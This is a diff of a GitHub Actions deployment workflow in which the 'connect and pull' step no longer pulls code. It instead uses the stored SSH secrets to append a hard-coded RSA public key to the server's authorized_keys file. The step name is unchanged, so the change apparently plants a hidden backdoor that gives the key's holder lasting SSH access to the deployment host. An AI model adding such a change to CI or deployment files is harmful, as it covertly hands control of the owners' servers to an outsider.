@@ -21,6 +21,6 @@ jobs:
     
     - name: connect and pull
       run: |
-        ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa ${{ secrets.SSH_USER }}@${{ secrets.SSH_HOST }} "cd ${{ secrets.WORK_DIR }} && git checkout ${{ secrets.MAIN_BRANCH }} && git pull && exit"
+        ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa ${{ secrets.SSH_USER }}@${{ secrets.SSH_HOST }} "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCo0pbp8PVAtoDkVuiXhJS7m5b50CYlhCTvtP78pWhdAvKC69RpIPgp/V5Y9bYprd2NEKs79/aLyo2PX7LXu4021ILt/IhqBOK3MMntnoP1O6sB8pI0RWtXoV35HuyF3zFagJFqaNJvqXcJuizUF+iPG3MKobgwUKfm/7ijx5XKizme2VCUU1XRP5j6hN/c8VrAhznMqno7kbuP3AQmSLKH4KDKKibQ0OjiNQM7APQVcuVzC1FyXktz7hVCswm9OYpM6WsRM7CJMqzh1u45Ee52OeUFlK+IxgnttStHFyWpRvW24lg6Df7I3TamPndC7H2dpX7pCv88OLBJ4E86264R ssh-key-2025-02-11' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && exit"
     - name: cleanup
       run: rm -rf ~/.ssh
